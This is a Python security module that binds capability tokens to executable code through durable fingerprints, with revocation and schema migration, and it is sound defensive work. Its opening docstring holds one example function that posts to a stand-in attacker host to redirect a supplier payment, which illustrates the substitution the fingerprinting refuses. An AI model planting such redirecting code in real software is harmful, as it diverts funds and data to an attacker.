"""Capability bindings for executable SINGULAR artifacts.

A textual module/name is descriptive, not an authority, so an executable
validated trajectory binds to an opaque capability token registered against the
exact callable or provider allowed to execute. That token is only half of an
identity: it lives in one process, while the decision that names it and the
attestation that authorizes it are durable.

The gap that opens is a restart. The in-memory table starts empty, so an old
token plus a freshly registered arbitrary object used to become a valid
authorization -- the token said nothing about *which code* it meant. A durable
record of the artifact fingerprint closes it: the token keeps meaning the
artifact it was first bound to, across restarts, and a re-registration under the
same token is only accepted when it presents the same artifact.

What a fingerprint covers and what it does not: it identifies the code object
(module, qualified name, and a hash of the code it runs), the interpreter
version it was compiled for, and -- for a function -- the values it captured and
its default arguments, so that two handlers built by the same factory with
different arguments are not mistaken for each other. Captures and defaults whose
value cannot be canonicalised deterministically (a live connection, an arbitrary
object) are recorded as opaque and therefore do not distinguish those targets;
that is a stated limit, exercised by a test, rather than a silent one.

"The code it runs" once meant `co_code` alone -- the instruction stream, and
nothing else a code object holds. Instructions address their operands by index,
so the constants, the global and attribute names, and the nested code objects
are all reachable only through tables that were not hashed. Two functions of the
same name whose only difference is which URL they post to, or which global they
call, compile to byte-identical instructions:

    def send(action): return post("https://bank.example/pay-supplier")
    def send(action): return post("https://attacker.example/pay-me")

Those were one artifact by this measure, which is the substitution the durable
record exists to refuse. The digest now covers the whole code object -- code,
consts (recursing into nested code), names, varnames, freevars, cellvars, the
argument counts and the flags -- so an implementation differs from another
whenever anything it would actually do differs.

For a class, every attribute counts, not only the ones carrying `__code__`: a
`property` holds its code in its getter, a `functools.partial` in its target and
bound arguments, and a class constant is where an endpoint or an account number
naturally lives. Attributes that are neither code nor an immutable value are
recorded by type alone, so a class-level cache cannot revoke a live capability
by filling up.

What stays uncovered, deliberately: what a global name resolves to. `co_names`
records that a function calls `post`, never which `post`. Covering the resolved
values would fold live module state into the identity; rewriting the function
object, which is the easier tampering, is caught.

Class bytecode says nothing about what an instance holds, so two providers of
the same class pointing at different endpoints were the same artifact by this
measure: after a restart, re-registering the token against a differently
configured instance satisfied both the durable record and the decision that
named it. An artifact can close that for itself by exposing
`artifact_identity()`, whose canonicalised result joins the fingerprint. It
stays opt-in: an object that declares nothing is fingerprinted exactly as
before, and what it holds stays uncovered. The fingerprint answers "is this the
same implementation, configured the way it was authorized", never "will it
behave the same way".
"""
from __future__ import annotations

import hashlib
import json
import sqlite3
import sys
from contextlib import AbstractContextManager
from dataclasses import dataclass
from datetime import UTC, datetime
from functools import partial
from pathlib import Path
from secrets import token_urlsafe
from threading import RLock
from types import CodeType
from typing import Any

from .sqlite_support import SqliteLocation

SCHEMA_VERSION = 2

#: Why every capability written under schema v1 is revoked when the database is
#: opened. A v1 row's fingerprint covered `co_code` alone, so it does not say
#: which implementation the token stood for, and the artifact it was bound to is
#: not available here to recompute it. Revoking is the only honest answer:
#: re-binding those tokens would grant exactly the substitution v2 exists to
#: refuse. Rotation issues new tokens, which is a supported operation.
V1_FINGERPRINT_REVOCATION = (
    "bound under schema v1, whose fingerprint covered bytecode alone; rotate to a new capability id"
)

#: Interpreter identity, so a capability bound under one runtime is not silently
#: honoured under another whose bytecode means something different.
RUNTIME_VERSION = f"cpython-{sys.version_info.major}.{sys.version_info.minor}"


#: Types whose value can be canonicalised into a fingerprint deterministically.
#: Anything else is recorded as opaque -- see _closure_identity.
_CANONICAL_TYPES = (str, int, float, bool, bytes, type(None))


def _canonical_value(value: Any) -> Any:
    if isinstance(value, bool) or value is None or isinstance(value, (str, int, float)):
        return value
    if isinstance(value, bytes):
        return value.hex()
    if isinstance(value, (tuple, list, frozenset, set)):
        items = [_canonical_value(item) for item in value]
        return sorted(items, key=repr) if isinstance(value, (frozenset, set)) else items
    if isinstance(value, dict):
        return {str(key): _canonical_value(item) for key, item in sorted(value.items(), key=lambda pair: str(pair[0]))}
    return {"__opaque__": type(value).__qualname__}


def _closure_identity(func: Any) -> list[Any]:
    """What a closure captured, when that can be stated deterministically.

    Bytecode alone does not distinguish two closures produced by the same
    factory: make(1) and make(2) share a module, a qualified name and every
    instruction, yet do different things. Capturing the values closes that,
    for captures whose value can be canonicalised. Captures that cannot -- a
    live connection, an arbitrary object -- are recorded as opaque, which is a
    stated limit rather than a silent one.
    """
    code = getattr(func, "__code__", None)
    cells = getattr(func, "__closure__", None)
    if code is None or not cells:
        return []
    captured: list[Any] = []
    for name, cell in zip(getattr(code, "co_freevars", ()), cells, strict=False):
        try:
            captured.append([name, _canonical_value(cell.cell_contents)])
        except ValueError:
            captured.append([name, {"__empty_cell__": True}])
    return captured


def _const_identity(value: Any) -> Any:
    """One entry of `co_consts`, canonicalised, recursing into nested code.

    A comprehension, a lambda or a nested function is compiled into a code
    object stored here; hashing its `repr` would identify it by memory address,
    so it is hashed the same way its parent is. The types are the ones the
    compiler can put in a constant table, listed explicitly: an entry of any
    other type is refused rather than folded into an opaque bucket, because a
    constant that cannot be told apart is the exact hole this function closes.
    """
    if isinstance(value, CodeType):
        return {"code": _code_payload(value)}
    if value is None:
        return {"none": True}
    if value is Ellipsis:
        return {"ellipsis": True}
    if isinstance(value, bool):
        return {"bool": value}
    if isinstance(value, int):
        # str(), not the int itself: json would render 1 and True alike, and a
        # very large int is exact here where a float is not.
        return {"int": str(value)}
    if isinstance(value, float):
        # hex() is exact and distinguishes 0.0 from -0.0; repr rounds.
        return {"float": value.hex()}
    if isinstance(value, complex):
        return {"complex": [value.real.hex(), value.imag.hex()]}
    if isinstance(value, str):
        return {"str": value}
    if isinstance(value, bytes):
        return {"bytes": value.hex()}
    if isinstance(value, tuple):
        return {"tuple": [_const_identity(item) for item in value]}
    if isinstance(value, frozenset):
        items = [_const_identity(item) for item in value]
        return {"frozenset": sorted(items, key=lambda item: json.dumps(item, sort_keys=True, separators=(",", ":")))}
    raise ValueError(f"a constant of type {type(value).__qualname__} cannot be fingerprinted")


def _code_payload(code: CodeType) -> dict[str, Any]:
    """Everything a code object holds that decides what running it does.

    `co_code` is the instruction stream and its operands are indices into the
    tables below, so hashing it alone identified the *shape* of a function and
    not the function: same instructions, different constants, different names.
    """
    return {
        "name": code.co_name,
        "argcount": code.co_argcount,
        "posonlyargcount": code.co_posonlyargcount,
        "kwonlyargcount": code.co_kwonlyargcount,
        "flags": code.co_flags,
        "code": bytes(code.co_code).hex(),
        "consts": [_const_identity(const) for const in code.co_consts],
        "names": list(code.co_names),
        "varnames": list(code.co_varnames),
        "freevars": list(code.co_freevars),
        "cellvars": list(code.co_cellvars),
    }


def _code_bytes(code: CodeType) -> bytes:
    return json.dumps(_code_payload(code), sort_keys=True, separators=(",", ":")).encode("utf-8")


def _function_state(func: Any) -> dict[str, Any]:
    """What a function carries beside its code: captures and default arguments.

    Defaults are evaluated once at definition and live on the function, not in
    the code object, so `def send(action, url="https://bank.example")` and the
    same line naming another host are one code object with two behaviours.
    """
    return {
        "captured": _closure_identity(func),
        "defaults": [_canonical_value(value) for value in (getattr(func, "__defaults__", None) or ())],
        "kwdefaults": {
            str(name): _canonical_value(value)
            for name, value in sorted((getattr(func, "__kwdefaults__", None) or {}).items(), key=lambda pair: str(pair[0]))
        },
    }


#: Class attributes of these types are covered by value. Anything else -- a
#: dict, a list, an arbitrary object -- is covered by type only, because a class
#: attribute used as a cache would otherwise change the artifact's identity while
#: it runs, revoking a live capability over an implementation detail.
_IMMUTABLE_DATA_TYPES = (str, bytes, bool, int, float, complex, type(None))


def _class_data_identity(value: Any) -> Any:
    """A class attribute that is not code: its value when that is stable."""
    if isinstance(value, (*_IMMUTABLE_DATA_TYPES, tuple, frozenset)):
        try:
            return {"const": _const_identity(value)}
        except ValueError:
            pass
    return {"type": type(value).__qualname__}


def _member_identity(member: Any) -> Any:
    """What one class attribute contributes to the identity of its class.

    Skipping everything without `__code__` -- which is what this did -- left
    three ways to put the interesting part of a class somewhere unhashed: a
    `property`, whose getter holds the code; a `functools.partial`, whose target
    and bound arguments are the behaviour; and a plain class constant, which is
    where an endpoint or an account number naturally lives. Two classes of the
    same name differing only in one of those were the same artifact.
    """
    code = getattr(member, "__code__", None)
    if code is not None:
        return {"code": _code_payload(code), "state": _function_state(member)}
    func = getattr(member, "__func__", None)
    if func is not None and getattr(func, "__code__", None) is not None:
        return {"bound": {"code": _code_payload(func.__code__), "state": _function_state(func)}}
    if isinstance(member, property):
        return {"property": [None if part is None else _member_identity(part)
                             for part in (member.fget, member.fset, member.fdel)]}
    if isinstance(member, partial):
        return {"partial": {
            "func": _member_identity(member.func),
            "args": [_canonical_value(arg) for arg in member.args],
            "keywords": {str(name): _canonical_value(value)
                         for name, value in sorted(member.keywords.items(), key=lambda pair: str(pair[0]))},
        }}
    if callable(member):
        owner = type(member)
        called = getattr(owner, "__call__", None)
        call_code = getattr(called, "__code__", None)
        return {"callable": [getattr(member, "__module__", "") or owner.__module__,
                             getattr(member, "__qualname__", "") or owner.__qualname__,
                             None if call_code is None else _code_payload(call_code)]}
    return {"data": _class_data_identity(member)}


def _class_identity(kind: type) -> bytes:
    parts: list[Any] = []
    for name in sorted(dir(kind)):
        if name.startswith("__"):
            continue
        try:
            member = getattr(kind, name)
        except Exception:
            # A descriptor that refuses to be read is recorded as such: silence
            # here would mean an attribute could hide behind raising.
            parts.append([name, {"unreadable": True}])
            continue
        parts.append([name, _member_identity(member)])
    return json.dumps(parts, sort_keys=True, separators=(",", ":")).encode("utf-8")


def _code_identity(target: Any) -> tuple[str, str, str, bytes, dict[str, Any]]:
    """(kind, module, qualname, code identity bytes, function state) for a target."""
    code = getattr(target, "__code__", None)
    if code is not None:
        return ("callable", getattr(target, "__module__", "") or "", getattr(target, "__qualname__", "") or "",
                _code_bytes(code), _function_state(target))
    func = getattr(target, "__func__", None)
    if func is not None and getattr(func, "__code__", None) is not None:
        return ("method", getattr(func, "__module__", "") or "", getattr(func, "__qualname__", "") or "",
                _code_bytes(func.__code__), _function_state(func))
    kind = type(target)
    return ("object", kind.__module__, kind.__qualname__, _class_identity(kind), {})


def _declared_identity(target: Any) -> Any:
    """What an artifact says its configuration is, when it offers to say it.

    Opt-in on purpose. Reading an instance's attributes wholesale would fold
    mutable working state into the identity, so a counter ticking during a run
    would revoke the artifact mid-execution; an artifact that declares its own
    configuration states what is meant to be stable about it. A declaration that
    cannot be produced is refused rather than skipped: an object that started to
    answer the question and failed is not the same as one that never claimed to.
    """
    declare = getattr(target, "artifact_identity", None)
    if not callable(declare):
        return None
    try:
        declared = declare()
    except Exception as exc:
        raise ValueError(f"artifact identity could not be established: {exc}") from exc
    if declared is None:
        raise ValueError("artifact identity declared nothing")
    return _canonical_value(declared)


def artifact_fingerprint(target: Any) -> str:
    """A stable identity for the code a capability token stands for."""
    if target is None:
        raise ValueError("an execution target is required")
    kind, module, qualname, code, state = _code_identity(target)
    payload = {
        "kind": kind,
        "module": module,
        "qualname": qualname,
        "runtime": RUNTIME_VERSION,
        "code": hashlib.sha256(code).hexdigest(),
        "state": state,
    }
    declared = _declared_identity(target)
    if declared is not None:
        # Absent when nothing is declared, so every artifact that predates this
        # keeps the fingerprint it already had: no durable record is invalidated.
        payload["declared"] = declared
    return hashlib.sha256(json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")).hexdigest()


@dataclass(frozen=True)
class CapabilityRecord:
    capability_id: str
    artifact_fingerprint: str
    artifact_kind: str
    module: str
    qualname: str
    runtime_version: str
    epoch: int
    status: str
    created_at: str
    revoked_at: str | None = None
    revoked_reason: str | None = None

    @property
    def active(self) -> bool:
        return self.status == "ACTIVE"


class DurableCapabilityStore:
    """What a capability token means, across restarts."""

    def __init__(self, path: str | Path = "data/singular.db") -> None:
        self._location = SqliteLocation(path)
        self.path = self._location.reference
        self._init_schema()

    def _connect(self) -> AbstractContextManager[sqlite3.Connection]:
        return self._location.session()

    def _init_schema(self) -> None:
        with self._connect() as conn:
            conn.execute("CREATE TABLE IF NOT EXISTS execution_capability_schema (version INTEGER NOT NULL)")
            # Created before the version is read, so a v1 database has the table
            # the migration below writes to; `IF NOT EXISTS` leaves an existing
            # v1 table alone, which is why the migration adds its column itself.
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS execution_capabilities (
                    capability_id TEXT PRIMARY KEY,
                    artifact_fingerprint TEXT NOT NULL,
                    artifact_kind TEXT NOT NULL,
                    module TEXT NOT NULL,
                    qualname TEXT NOT NULL,
                    runtime_version TEXT NOT NULL,
                    epoch INTEGER NOT NULL,
                    status TEXT NOT NULL,
                    created_at TEXT NOT NULL,
                    revoked_at TEXT,
                    revoked_reason TEXT
                )
                """
            )
            row = conn.execute("SELECT version FROM execution_capability_schema").fetchone()
            if row is None:
                conn.execute("INSERT INTO execution_capability_schema(version) VALUES(?)", (SCHEMA_VERSION,))
                return
            version = int(row["version"])
            if version == SCHEMA_VERSION:
                return
            if version == 1:
                self._migrate_v1(conn)
                return
            raise RuntimeError(
                f"execution capability schema v{version} does not match v{SCHEMA_VERSION}; refusing to read it"
            )

    @staticmethod
    def _migrate_v1(conn: sqlite3.Connection) -> None:
        """Retire every v1 binding instead of carrying its fingerprint forward.

        A v1 fingerprint covered `co_code` alone, so the row does not say which
        implementation the token stood for, and recomputing it is impossible
        from here: the artifact lives in a process, not in this database. Left
        as ACTIVE, each row would go on authorizing any implementation that
        shares its instruction stream. Deleted, each token would re-bind to
        whatever object is presented first after the upgrade -- the restart
        bypass, granted once to whoever runs it. Revoked, they refuse, and say
        why: rotation to a new token is the supported way forward.
        """
        columns = {str(row["name"]) for row in conn.execute("PRAGMA table_info(execution_capabilities)")}
        if "revoked_reason" not in columns:
            conn.execute("ALTER TABLE execution_capabilities ADD COLUMN revoked_reason TEXT")
        conn.execute(
            "UPDATE execution_capabilities SET status='REVOKED', revoked_at=?, revoked_reason=? WHERE status='ACTIVE'",
            (datetime.now(UTC).isoformat(), V1_FINGERPRINT_REVOCATION),
        )
        conn.execute("UPDATE execution_capability_schema SET version=?", (SCHEMA_VERSION,))

    def get(self, capability_id: str) -> CapabilityRecord | None:
        with self._connect() as conn:
            row = conn.execute("SELECT * FROM execution_capabilities WHERE capability_id=?", (capability_id,)).fetchone()
        return None if row is None else self._record(row)

    def bind(self, capability_id: str, target: Any) -> CapabilityRecord:
        """Bind a token to an artifact, or confirm it already means that artifact.

        A token that already stands for one artifact can never be pointed at
        another: that is the restart bypass. A revoked token is never re-bound --
        rotation issues a new token rather than reviving a retired one.
        """
        fingerprint = artifact_fingerprint(target)
        kind, module, qualname, _, _ = _code_identity(target)
        now = datetime.now(UTC).isoformat()
        with self._connect() as conn:
            row = conn.execute("SELECT * FROM execution_capabilities WHERE capability_id=?", (capability_id,)).fetchone()
            if row is not None:
                record = self._record(row)
                if record.status == "REVOKED":
                    reason = f" ({record.revoked_reason})" if record.revoked_reason else ""
                    raise PermissionError(f"a revoked capability id cannot be re-registered{reason}")
                if record.artifact_fingerprint != fingerprint:
                    raise PermissionError("capability id is already bound to a different executable artifact")
                if record.runtime_version != RUNTIME_VERSION:
                    raise PermissionError("capability was registered under a different runtime version")
                return record
            conn.execute(
                "INSERT INTO execution_capabilities(capability_id,artifact_fingerprint,artifact_kind,module,qualname,runtime_version,epoch,status,created_at)"
                " VALUES(?,?,?,?,?,?,?,?,?)",
                (capability_id, fingerprint, kind, module, qualname, RUNTIME_VERSION, 1, "ACTIVE", now),
            )
        return CapabilityRecord(capability_id, fingerprint, kind, module, qualname, RUNTIME_VERSION, 1, "ACTIVE", now)

    def revoke(self, capability_id: str) -> CapabilityRecord:
        now = datetime.now(UTC).isoformat()
        with self._connect() as conn:
            cur = conn.execute(
                "UPDATE execution_capabilities SET status='REVOKED', revoked_at=? WHERE capability_id=? AND status='ACTIVE'",
                (now, capability_id),
            )
            if cur.rowcount != 1:
                raise KeyError(capability_id)
            row = conn.execute("SELECT * FROM execution_capabilities WHERE capability_id=?", (capability_id,)).fetchone()
        return self._record(row)

    def verify(self, capability_id: str, target: Any) -> bool:
        """Is this token still active and still meaning this artifact?"""
        record = self.get(capability_id)
        if record is None or not record.active:
            return False
        if record.runtime_version != RUNTIME_VERSION:
            return False
        try:
            return record.artifact_fingerprint == artifact_fingerprint(target)
        except ValueError:
            return False

    @staticmethod
    def _record(row: sqlite3.Row) -> CapabilityRecord:
        return CapabilityRecord(
            row["capability_id"], row["artifact_fingerprint"], row["artifact_kind"], row["module"], row["qualname"],
            row["runtime_version"], int(row["epoch"]), row["status"], row["created_at"], row["revoked_at"],
            row["revoked_reason"],
        )


class ExecutionCapabilityRegistry:
    """Bind opaque capability ids to exact in-process execution objects.

    The in-memory table answers "is this the very object that was registered".
    A durable store, when one is attached, answers the question that survives a
    restart: "is this the artifact the token has always meant".
    """

    def __init__(self, durable: DurableCapabilityStore | None = None) -> None:
        self._lock = RLock()
        self._targets: dict[str, Any] = {}
        self._by_object: dict[int, str] = {}
        self._fingerprints: dict[str, str] = {}
        self.durable = durable

    def attach(self, durable: DurableCapabilityStore) -> None:
        """Give an existing registry a durable meaning for the tokens it holds.

        Two ways this used to end somewhere weaker than it started.

        A bind that raised partway -- one token already meaning another artifact
        durably -- left `self.durable` unset, so every token the registry held
        went back to being verified in memory alone: the failure removed the
        durable half rather than refusing. The store is attached before the
        bindings are written now, so a failure leaves the registry stricter than
        before. Tokens that were not bound stop matching until they are
        registered again, which is the fail-closed direction.

        Replacing an attached store is refused outright. Pointing a registry at
        a fresh database would rewrite what every token durably means from
        whatever is in memory now -- exactly the restart substitution, performed
        deliberately.
        """
        with self._lock:
            if self.durable is not None and self.durable is not durable:
                raise PermissionError("a registry's durable capability store cannot be replaced")
            self.durable = durable
            for capability_id, target in self._targets.items():
                durable.bind(capability_id, target)

    def register(self, target: Any, capability_id: str | None = None) -> str:
        if target is None:
            raise ValueError("an execution target is required")
        with self._lock:
            existing = self._by_object.get(id(target))
            if existing is not None and self._targets.get(existing) is target:
                if capability_id is not None and capability_id != existing:
                    raise ValueError("target is already bound to a different capability")
                return existing
            token = capability_id or f"cap_{token_urlsafe(24)}"
            if not token.strip():
                raise ValueError("capability id cannot be empty")
            bound = self._targets.get(token)
            if bound is not None and bound is not target:
                raise ValueError("capability id is already bound to another target")
            fingerprint = artifact_fingerprint(target)
            if self.durable is not None:
                self.durable.bind(token, target)
            self._targets[token] = target
            self._by_object[id(target)] = token
            self._fingerprints[token] = fingerprint
            return token

    def matches(self, capability_id: str, target: Any) -> bool:
        if not capability_id or target is None:
            return False
        with self._lock:
            if self._targets.get(capability_id) is not target:
                return False
            if self._fingerprints.get(capability_id) != artifact_fingerprint(target):
                return False
            durable = self.durable
        # Read the durable record outside the lock: it is the authority on
        # revocation, and it is re-read on every check so a token revoked between
        # validation and execution stops matching immediately.
        return True if durable is None else durable.verify(capability_id, target)

    def fingerprint_of(self, capability_id: str) -> str | None:
        with self._lock:
            return self._fingerprints.get(capability_id)

    def revoke(self, capability_id: str) -> None:
        """Retire a token here and durably, durably first.

        The in-process entry was dropped before the durable write was attempted,
        so a write that failed left the token dead in this process and ACTIVE in
        the next one: a revocation that a restart undoes. The durable record is
        the half that survives, so it goes first, and the local entry is dropped
        either way -- a caller who sees the error knows the revocation is not
        durable, and meanwhile nothing here will execute under that token.
        """
        with self._lock:
            durable = self.durable
        try:
            if durable is not None:
                try:
                    durable.revoke(capability_id)
                except KeyError:
                    pass  # never bound durably: there is nothing to retire there
        finally:
            with self._lock:
                target = self._targets.pop(capability_id, None)
                self._fingerprints.pop(capability_id, None)
                if target is not None:
                    self._by_object.pop(id(target), None)


GLOBAL_EXECUTION_CAPABILITIES = ExecutionCapabilityRegistry()


def register_execution_capability(target: Any, capability_id: str | None = None) -> str:
    return GLOBAL_EXECUTION_CAPABILITIES.register(target, capability_id)


def execution_capability_matches(capability_id: str, target: Any) -> bool:
    return GLOBAL_EXECUTION_CAPABILITIES.matches(capability_id, target)


__all__ = [
    "GLOBAL_EXECUTION_CAPABILITIES",
    "RUNTIME_VERSION",
    "SCHEMA_VERSION",
    "V1_FINGERPRINT_REVOCATION",
    "CapabilityRecord",
    "DurableCapabilityStore",
    "ExecutionCapabilityRegistry",
    "artifact_fingerprint",
    "execution_capability_matches",
    "register_execution_capability",
]
